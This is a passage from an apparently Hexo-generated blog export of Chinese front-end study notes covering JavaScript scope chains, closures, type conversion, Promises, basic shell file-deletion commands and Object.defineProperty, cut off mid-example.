<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line">b = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">this</span>.c = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">delete</span> a;</span><br><span class="line"><span class="keyword">delete</span> b;</span><br><span class="line"><span class="keyword">delete</span> c;</span><br><span class="line"><span class="built_in">console</span>.log(a);<span class="comment">//1</span></span><br><span class="line"><span class="built_in">console</span>.log(b);<span class="comment">//未定义</span></span><br><span class="line"><span class="built_in">console</span>.log(c);<span class="comment">//未定义</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>作用域链</strong><ul>
<li>每一段js代码（全局代码或者函数）都有一个与之关联的作用域链，这个作用域链是一个<strong>对象列表或链表</strong>；</li>
<li>“<strong>变量解析</strong>”过程：查找一个变量x的值时，先<strong>从链的第一个对象中查找</strong>，如果该对象有叫x这个属性的话，则使用这个属性的值，<pre><code>否则查找链上的下一个对象，以此类推，直到找到，否则抛出一个引用错误（Reference Error）的异常。
</code></pre></li>
<li>所以对于最顶层代码，链上只有一个全局对象；在全局对象包含的一个没有嵌套的函数体内，其链上第一个是定义该函数参数和局部变量的对象，第二个是全局对象，依次类推；</li>
<li>定义一个函数时，他的<strong>作用域已被决定</strong>。调用该函数时，程序会创建一个新的对象来存储该函数的局部变量，并将这个对象添加到该函数本来的作用域链上。（这里意思我觉得应该就是复制原来的作用域链给自己）</li>
<li>对于嵌套函数来说，每次其外部函数被调用时，内部函数会被重新定义了一遍，因为调用时创建了一个新的对象，所以这时候嵌套函数的作用域链也会跟着改变。</li>
</ul>
</li>
</ul>
<h3 id="8-9-闭包"><a href="#8-9-闭包" class="headerlink" title="8.9 闭包"></a>8.9 闭包</h3><ul>
<li>理解了作用域链，闭包也就好理解多了；</li>
<li>当内部函数在定义它的作用域的外部被引用时,就创建了该内部函数的闭包,如果内部函数引用了位于外部函数的变量,当外部函数调用完毕后,这些变量在内存不会被释放,因为闭包需要它们，涉及js垃圾回收机制；</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">outerFun</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="keyword">var</span> a=<span class="number">0</span>;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">innerFun</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      a++;</span><br><span class="line">      alert(a);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> innerFun;  <span class="comment">//注意这里</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> obj=outerFun();</span><br><span class="line">    obj();  <span class="comment">//结果为1</span></span><br><span class="line">    obj();  <span class="comment">//结果为2</span></span><br><span class="line">    <span class="keyword">var</span> obj2=outerFun();</span><br><span class="line">    obj2();<span class="comment">//结果为1</span></span><br><span class="line">    obj2();<span class="comment">//结果为2</span></span><br></pre></td></tr></table></figure>
<ul>
<li>闭包着实不好理解…..前面我把闭包想简单了….在参考了阮一峰等大神的博客之后写了一篇<a href="http://www.ruanyifeng.com/blog/2009/08/learning_javascript_closures.html" target="_blank" rel="noopener">博客</a>作为整理思路，理解闭包之后js的Garbage Collection好理解多了…在博客最后也写到了GC；</li>
</ul>
<h2 id="第三章下-类型、值、变量"><a href="#第三章下-类型、值、变量" class="headerlink" title="第三章下 类型、值、变量"></a>第三章下 类型、值、变量</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typeof</span>(<span class="literal">null</span>);<span class="comment">//object</span></span><br><span class="line"><span class="keyword">typeof</span>(<span class="literal">undefined</span>);<span class="comment">//undefined</span></span><br><span class="line"><span class="literal">undefined</span> == <span class="literal">null</span>;<span class="comment">//true</span></span><br><span class="line"><span class="literal">undefined</span> === <span class="literal">null</span>;<span class="comment">//false</span></span><br></pre></td></tr></table></figure>
<h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><ul>
<li>js解释器启动时（浏览器加载页面时），创建一个新的全局对象，定义一些初始属性：<ul>
<li>全局属性：undefined、NaN;</li>
<li>全局函数：parseInt(),eval()等；</li>
<li>构造函数：Date(),RegExp(),String()，Array()等；</li>
<li>全局对象：Math,JSON</li>
</ul>
</li>
<li>在代码最顶层可使用this引用全局对象；</li>
<li>在浏览器中window充当全局对象；</li>
</ul>
<h3 id="一些对象-诸如包装对象、对象比较"><a href="#一些对象-诸如包装对象、对象比较" class="headerlink" title="一些对象,诸如包装对象、对象比较"></a>一些对象,诸如包装对象、对象比较</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s =<span class="string">"test"</span>;</span><br><span class="line">s.indexOf(<span class="string">"e"</span>);<span class="comment">//1</span></span><br><span class="line">s.len=<span class="number">4</span>;</span><br><span class="line"><span class="keyword">var</span> a =s.len;</span><br><span class="line"><span class="built_in">console</span>.log(a);<span class="comment">//undefined</span></span><br></pre></td></tr></table></figure>
<p>如上代码，s.indexOf()可以调用Sting对象的方法，所以s是个临时对象，但s.len的值并没有赋给a;<br>这是因为字符串s引用Sting对象的方法indexOf()时，会创建一个临时对象，<strong>引用完之后就被GC回收</strong>，此时不是对象就不能创建一个新的属性len；a自然就未定义；<br><strong>所以，包装对象就是存取字符串、数字、布尔的属性时创建的临时对象；</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">"ab"</span>);</span><br><span class="line">s.len=<span class="number">2</span>;</span><br><span class="line"><span class="keyword">var</span> a =s.len;</span><br><span class="line"><span class="built_in">console</span>.log(a);<span class="comment">//2</span></span><br></pre></td></tr></table></figure>
<p>通过构造函数显式创建包装函数，可以实现为其添加属性（这是一般正常的用法~~~）</p>
<ul>
<li>原始值（undefined,null,布尔，数字，字符串）不可更改，对象中的值（数组，函数）可以更改；</li>
<li>两个属性和属性值都相等的对象也是<strong>不相等</strong>的：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a=&#123;<span class="attr">x</span>:<span class="number">1</span>&#125;,b=&#123;<span class="attr">x</span>:<span class="number">1</span>&#125;;</span><br><span class="line">a===b;<span class="comment">//false,两个=也不相等</span></span><br><span class="line"><span class="keyword">var</span> c = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],d=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">c===d;<span class="comment">//false</span></span><br></pre></td></tr></table></figure>
<h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><ul>
<li>转为数字和布尔值：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="literal">undefined</span> -&gt; <span class="literal">NaN</span>/<span class="literal">false</span></span><br><span class="line"><span class="literal">null</span> -&gt; <span class="number">0</span>/<span class="literal">false</span></span><br><span class="line"><span class="string">""</span> -&gt;<span class="number">0</span>/<span class="literal">false</span></span><br><span class="line"><span class="string">"1.2"</span> -&gt;<span class="number">1.2</span>/<span class="literal">true</span></span><br><span class="line"><span class="string">"one"</span> -&gt;<span class="literal">NaN</span>/<span class="literal">true</span></span><br><span class="line"><span class="number">0</span>/<span class="number">-0</span> -&gt;<span class="number">0</span>/<span class="literal">false</span></span><br><span class="line"><span class="literal">NaN</span> -&gt;<span class="literal">false</span></span><br><span class="line">[] -&gt;<span class="number">0</span>/<span class="literal">false</span></span><br><span class="line">(除了<span class="number">0</span>、<span class="number">-0</span>、<span class="literal">NaN</span>的数字都是<span class="literal">true</span>)</span><br><span class="line">空数组、空对象、空函数都是<span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>使用“==”判断时，会自动转化类型，用“===”则不会；</p>
<ul>
<li>显示转换，调用构造函数如Number(“3”);</li>
<li>toString(进制)和toFixed(0/1/2/3/…)(保留n位小数)</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> n=<span class="number">17</span>;</span><br><span class="line"><span class="keyword">var</span> turn = n.toString(空/<span class="number">2</span>/<span class="number">8</span>/<span class="number">16</span>);<span class="comment">//不同进制</span></span><br></pre></td></tr></table></figure>
<h2 id="第四章-表达式和运算符"><a href="#第四章-表达式和运算符" class="headerlink" title="第四章 表达式和运算符"></a>第四章 表达式和运算符</h2><p>都是一些常见的东西…</p>
<ul>
<li><strong>in运算符</strong>测试属性是否存在，左侧为字符串或者可以转换为字符串，右侧为对象；(这个就有点像for-in语句了)</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">x</span>:<span class="number">1</span>,<span class="attr">y</span>:<span class="number">2</span>&#125;;</span><br><span class="line"><span class="string">"x"</span> <span class="keyword">in</span> obj;<span class="comment">//true</span></span><br><span class="line"><span class="string">"toString"</span> <span class="keyword">in</span> obj;<span class="comment">//true(因为obj继承了toString())</span></span><br><span class="line"><span class="keyword">var</span> arr=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="string">"1"</span> <span class="keyword">in</span> arr;<span class="comment">//true</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">in</span> arr;<span class="comment">//true</span></span><br></pre></td></tr></table></figure>
<ul>
<li>instanceof;左侧为一个对象（否则返回false），右侧为标识对象的类（<strong>涉及原型链</strong>）；</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>;</span><br><span class="line">d <span class="keyword">instanceof</span> <span class="built_in">Date</span>;<span class="comment">//true</span></span><br><span class="line">d <span class="keyword">instanceof</span> <span class="built_in">Object</span>;<span class="comment">//true</span></span><br><span class="line"><span class="comment">//(数组同理)</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p><strong>&amp;&amp; 新理解</strong>&amp;&amp;原来除了我之前一直以为的对布尔值或者转换后的布尔值进行与操作外，还有第三层骚操作！！！</p>
<ul>
<li>&amp;&amp;语句会先运行左操作数，如果左操作数返回结果为false，则其不会再运行右操作数；</li>
<li>左为真，则其会运行右操作数并将右操作数返回结果作为整个表达式的结果！</li>
</ul>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(a == b)stop();</span><br><span class="line"><span class="comment">//等价于</span></span><br><span class="line">(a==b) &amp;&amp; stop();</span><br></pre></td></tr></table></figure>
<ul>
<li>|| 计算第一个操作数，真则返回该结果；否则运算第二个；都为假则返回假值；</li>
<li>eval();</li>
</ul>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>js</tag>
        <tag>犀牛书</tag>
      </tags>
  </entry>
  <entry>
    <title>Promise对象-异步编程解决方案</title>
    <url>/2017/11/Promise%E5%AF%B9%E8%B1%A1-%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88.html</url>
    <content><![CDATA[<ul>
<li>不使用promise</li>
<li>使用promise<ul>
<li>三种状态</li>
<li>声明一个Promise对象</li>
<li>Promise.then()</li>
<li>Promise中的数据传递</li>
<li>Promise.all()</li>
<li>Promise.race()</li>
</ul>
</li>
</ul>
<a id="more"></a>
<h2 id="不使用promise"><a href="#不使用promise" class="headerlink" title="不使用promise"></a>不使用promise</h2><p>当我们使用AJAX请求一个数据时：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="string">'https://xxx.com/xx.json'</span>;</span><br><span class="line"><span class="keyword">var</span> result;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> XHR = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">XHR.open(<span class="string">'GET'</span>, url, <span class="literal">true</span>);</span><br><span class="line">XHR.send();</span><br><span class="line"></span><br><span class="line">XHR.onreadystatechange = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (XHR.readyState == <span class="number">4</span> &amp;&amp; XHR.status == <span class="number">200</span>) &#123;</span><br><span class="line">        result = XHR.response;</span><br><span class="line">        <span class="built_in">console</span>.log(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当需要做另外一个ajax请求，这个新的ajax请求的其中一个参数，得从<strong>上一个ajax请求</strong>中获取，这个时候我们就不得不如下这样做：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="string">'https://xxx.com/xx.json'</span>;</span><br><span class="line"><span class="keyword">var</span> result;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> XHR = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">XHR.open(<span class="string">'GET'</span>, url, <span class="literal">true</span>);</span><br><span class="line">XHR.send();</span><br><span class="line"></span><br><span class="line">XHR.onreadystatechange = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (XHR.readyState == <span class="number">4</span> &amp;&amp; XHR.status == <span class="number">200</span>) &#123;</span><br><span class="line">        result = XHR.response;</span><br><span class="line">        <span class="built_in">console</span>.log(result);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 新的ajax请求</span></span><br><span class="line">        <span class="keyword">var</span> url2 = <span class="string">'https://xxx.com/xx.json'</span>;</span><br><span class="line">        <span class="keyword">var</span> XHR2 = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        XHR2.open(<span class="string">'GET'</span>, url, <span class="literal">true</span>);</span><br><span class="line">        XHR2.send();</span><br><span class="line">        XHR2.onreadystatechange = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果有多个ajax请求都需要其上一个请求中的数据时，即使使用<strong>回调函数</strong>也会使代码可读性和可维护性降低，层层嵌套从而产生所谓的回调地狱。</p>
<h2 id="使用promise"><a href="#使用promise" class="headerlink" title="使用promise"></a>使用promise</h2><h3 id="状态"><a href="#状态" class="headerlink" title="状态"></a>状态</h3><p>promise有三种状态，分别是</p>
<ul>
<li><p>pending -进行中</p>
</li>
<li><p>resolved -已完成</p>
</li>
<li><p>rejected -已失败</p>
</li>
</ul>
<p>当Promise的状态又pending转变为resolved或rejected时，会执行相应的方法，并且状态一旦改变，就无法再次改变状态，这也是它名字promise-承诺的由来.</p>
<h3 id="声明一个Promise对象"><a href="#声明一个Promise对象" class="headerlink" title="声明一个Promise对象"></a>声明一个Promise对象</h3><p>在Promise对象的构造函数中，将一个函数作为第一个参数。这个函数就是用来处理Promise的状态变化。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 方法1</span></span><br><span class="line"><span class="keyword">let</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span> ( <span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (success) &#123;</span><br><span class="line">    resolve(value);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    reject(error);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法2</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">promise</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span> (<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (success) &#123;</span><br><span class="line">      resolve(value);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      reject(error);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Promise-then"><a href="#Promise-then" class="headerlink" title="Promise.then()"></a>Promise.then()</h3><p>.then()方法使Promise原型链上的方法，它包含两个参数，分别是已成功<strong>resolved的回调</strong>和已失败<strong>rejected的回调</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">promise.then(</span><br><span class="line">    () =&gt; &#123; <span class="built_in">console</span>.log(<span class="string">'this is success callback'</span>) &#125;,</span><br><span class="line">    () =&gt; &#123; <span class="built_in">console</span>.log(<span class="string">'this is fail callback'</span>) &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<h3 id="Promise中的数据传递"><a href="#Promise中的数据传递" class="headerlink" title="Promise中的数据传递"></a>Promise中的数据传递</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> fn = <span class="function"><span class="params">num</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> num === <span class="string">'number'</span>) &#123;</span><br><span class="line">      resolve(num);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      reject(<span class="built_in">TypeError</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">fn(<span class="number">2</span>).then(<span class="function"><span class="params">num</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'first: '</span> + num);</span><br><span class="line">  <span class="keyword">return</span> num + <span class="number">1</span>;</span><br><span class="line">&#125;)</span><br><span class="line">  .then(<span class="function"><span class="params">num</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'second: '</span> + num);</span><br><span class="line">    <span class="keyword">return</span> num + <span class="number">1</span>;</span><br><span class="line">  &#125;)</span><br><span class="line">  .then(<span class="function"><span class="params">num</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'third: '</span> + num);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结果</span></span><br><span class="line"><span class="comment">// first: 2</span></span><br><span class="line"><span class="comment">// second: 3</span></span><br><span class="line"><span class="comment">// third: 4</span></span><br></pre></td></tr></table></figure>
<h3 id="Promise-all"><a href="#Promise-all" class="headerlink" title="Promise.all()"></a>Promise.all()</h3><p>当有一个ajax请求，它的参数需要另外2个甚至更多请求都有返回结果之后才能确定时，需要用到all()；<br>Promise.all接收一个<strong>Promise对象组成的数组</strong>作为参数，当这个数组所有的Promise对象状态都变成resolved的时候，它才会去调用成功回调方法。否则执行失败方法；</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> p1 = <span class="keyword">new</span> <span class="built_in">Promise</span>(...);</span><br><span class="line"><span class="keyword">let</span> p2 = <span class="keyword">new</span> <span class="built_in">Promise</span>(...);</span><br><span class="line"><span class="keyword">let</span> p3 = <span class="keyword">new</span> <span class="built_in">Promise</span>(...);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> promise = <span class="built_in">Promise</span>.all( [p1, p2, p3] );</span><br><span class="line">promise.then(</span><br><span class="line">    ...</span><br><span class="line">).catch(</span><br><span class="line">    ...</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<h3 id="Promise-race"><a href="#Promise-race" class="headerlink" title="Promise.race()"></a>Promise.race()</h3><p>与Promise.all相似的是，Promise.race都是以一个<strong>Promise对象组成的数组</strong>作为参数，不同的是，只要当数组中的<strong>其中一个Promsie状态</strong>变成resolved或者rejected时，就可以调用.then方法了；</p>
<p>参考：<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Promise" target="_blank" rel="noopener">MDN web docs</a><br><a href="http://www.jianshu.com/p/c98eb98bd00c" target="_blank" rel="noopener">看这一篇就够了！浅谈ES6的Promise对象</a><br><a href="http://www.jianshu.com/p/063f7e490e9a" target="_blank" rel="noopener">Javascript 中的神器——Promise</a><br><a href="http://www.jianshu.com/p/fe5f173276bd" target="_blank" rel="noopener">前端基础进阶（十三）：透彻掌握Promise的使用，读这篇就够了</a></p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>Shell常用脚本命令收集</title>
    <url>/2019/03/Shell%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86.html</url>
    <content><![CDATA[<p>macOS日常还是需要写shell脚本的，且项目构建打包自动化等都是需要会写shell，拿起大学学的linux…本文作为用到shell脚本命令的收集。</p>
<a id="more"></a>
<h2 id="日常文件操作"><a href="#日常文件操作" class="headerlink" title="日常文件操作"></a>日常文件操作</h2><h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><ul>
<li><p><code>rm -rf ./directory</code>  删除<code>./directory</code>下所有文件、文件夹</p>
</li>
<li><p><code>rm ./file.js</code> 删除<code>./file.js</code>文件</p>
</li>
<li><code>rm -f ./file.js</code> 强制删除<code>./file.js</code>文件, f: force</li>
</ul>
<h2 id="构建相关"><a href="#构建相关" class="headerlink" title="构建相关"></a>构建相关</h2><p>–</p>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>Vuex &amp; Redux - Redux</title>
    <url>/2019/06/Vuex%20&amp;%20Redux%20-%20redux.html</url>
    <content><![CDATA[<p>Todo</p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
  </entry>
  <entry>
    <title>Some tips in Jan,2018</title>
    <url>/2018/01/Some-tips-in-Jan-2018.html</url>
    <content><![CDATA[<h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><ul>
<li><del>Object.defineproperty()</del></li>
<li><del>margin垂直重叠</del></li>
<li><del>字的基线</del></li>
<li><del>深拷贝与浅拷贝</del></li>
<li><del>未声明的变量会自动升级为全局变量的原因</del></li>
<li><del>HTTPS与HTTP</del></li>
<li><del>&gt; ~ +</del></li>
<li><del>使用rem设置元素宽高在chrome中的问题</del></li>
<li><del>IOT 中pull-right/经纬度/地区输入</del></li>
<li><del>小题</del></li>
</ul>
<a id="more"></a>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj1 = &#123;</span><br><span class="line">    age: <span class="number">20</span>,</span><br><span class="line">    getAge: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>.age; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> obj2 = &#123; <span class="attr">age</span>: <span class="number">30</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> getAge = obj1.getAge;</span><br><span class="line">obj2.getAge = getAge;</span><br><span class="line"><span class="built_in">console</span>.log(obj1.getAge());</span><br><span class="line"><span class="built_in">console</span>.log(obj2.getAge());</span><br></pre></td></tr></table></figure>
<h2 id="Object-defineProperty"><a href="#Object-defineProperty" class="headerlink" title="Object.defineProperty()"></a>Object.defineProperty()</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.defineProperty(obj, prop, descriptor)</span><br></pre></td></tr></table></figure>
<p>该方法会直接在<strong>一个对象</strong>上定义一个<strong>新属性</strong>，或者<strong>修改</strong>一个对象的现有属性， 并<strong>返回这个对象</strong>。与常见的直接使用<code>.</code>和<code>[]</code>不同，它能通过<code>descriptor</code>参数定义属性的更多设定。</p>
<h3 id="obj"><a href="#obj" class="headerlink" title="obj"></a>obj</h3><p>要在其上定义属性的对象。</p>
<h3 id="prop"><a href="#prop" class="headerlink" title="prop"></a>prop</h3><p>字符串，要定义或修改的属性的名称。</p>
<h3 id="descriptor-属性描述符"><a href="#descriptor-属性描述符" class="headerlink" title="descriptor/属性描述符"></a>descriptor/属性描述符</h3><blockquote>
<p>对象里目前存在的属性描述符有两种主要形式：数据描述符和存取描述符。数据描述符是一个具有值的属性，该值可能是可写的，也可能不是可写的。访问器描述符是由getter-setter函数对描述的属性。描述符必须是这两种形式之一；不能同时是两者。</p>
</blockquote>
<table>
<thead>
<tr>
<th>/</th>
<th>configurable</th>
<th>enumerable</th>
<th>value</th>
<th>writable</th>
<th>get</th>
<th>set</th>
</tr>
</thead>
<tbody>
<tr>
<td>数据描述符</td>
<td>yes</td>
<td>y</td>
<td>y</td>
<td>y</td>
<td>no</td>
<td>n</td>
</tr>
<tr>
<td>存取描述符</td>
<td>y</td>
<td>y</td>
<td>n</td>
<td>n</td>
<td>y</td>
<td>y</td>
</tr>
</tbody>
</table>
<h4 id="configurable"><a href="#configurable" class="headerlink" title="configurable"></a>configurable</h4><p>设置属性描述符<code>descriptor</code>是否能被修改，默认为flase；如果尝试去更改<code>configurable:false</code>的<code>属性描述符</code>内的属性则会<strong>报错</strong>：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">  age: <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(a, <span class="string">'name'</span> , &#123;</span><br><span class="line">  configurable: <span class="literal">false</span>,</span><br><span class="line">  enumerable: <span class="literal">false</span>,</span><br><span class="line">  value: <span class="string">'obj'</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(a, <span class="string">'name'</span> , &#123;</span><br><span class="line">  configurable: <span class="literal">false</span>,</span><br><span class="line">  enumerable: <span class="literal">false</span>,</span><br><span class="line">  value: <span class="string">'name'</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// "error"</span></span><br><span class="line"><span class="comment">// "TypeError: Cannot redefine property: name</span></span><br></pre></td></tr></table></figure>
<h4 id="enumerable"><a href="#enumerable" class="headerlink" title="enumerable"></a>enumerable</h4><p>设置属性是否能被枚举，默认为flase，不能被枚举；</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">  age: <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(a, <span class="string">'name'</span> , &#123;</span><br><span class="line">  value: <span class="string">'obj'</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> a)&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(key + <span class="string">': '</span> + a[key]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// "age: 1"</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.keys(a));</span><br><span class="line"><span class="comment">// ["age"]</span></span><br><span class="line"><span class="comment">// 默认情况下'name'无法被枚举出来</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">  age: <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(a, <span class="string">'name'</span> , &#123;</span><br><span class="line">  enumerable: <span class="literal">true</span>,</span><br><span class="line">  value: <span class="string">'obj'</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.keys(a));</span><br><span class="line"><span class="comment">// ["age", "name"]</span></span><br></pre></td></tr></table></figure>
<h4 id="value"><a href="#value" class="headerlink" title="value"></a>value</h4><p>默认为<code>undefined</code></p>
<h4 id="writable"><a href="#writable" class="headerlink" title="writable"></a>writable</h4><p>仅当该属性的<code>writable</code>为<code>true</code>时，<code>value</code>才能被赋值运算符改变。默认为 <code>false</code>。</p>
<h5 id="这样一道题："><a href="#这样一道题：" class="headerlink" title="这样一道题："></a>这样一道题：</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  Question : please create a tool to generate Sequence</span></span><br><span class="line"><span class="comment">  Expected to be used like:</span></span><br><span class="line"><span class="comment">  var sequence1 = new Sequence();</span></span><br><span class="line"><span class="comment">  sequence1.next() --&gt; return 1;</span></span><br><span class="line"><span class="comment">  sequence1.next() --&gt; return 2;</span></span><br><span class="line"><span class="comment">  </span></span><br><span class="line"><span class="comment">  in another module:</span></span><br><span class="line"><span class="comment">  var sequence2 = new Sequence();</span></span><br><span class="line"><span class="comment">  sequence2.next() --&gt; 3;</span></span><br><span class="line"><span class="comment">  sequence2.next() --&gt; 4;</span></span><br><span class="line"><span class="comment">**/</span></span><br></pre></td></tr></table></figure>
<p>实例化构造函数时，新的实例都会刷新变量，因此使用通常的方法无法实现效果。</p>
<p>使用<code>Object.defineProperty</code>，并设置<code>writable: true</code>的<strong>解决方法</strong>：</p>
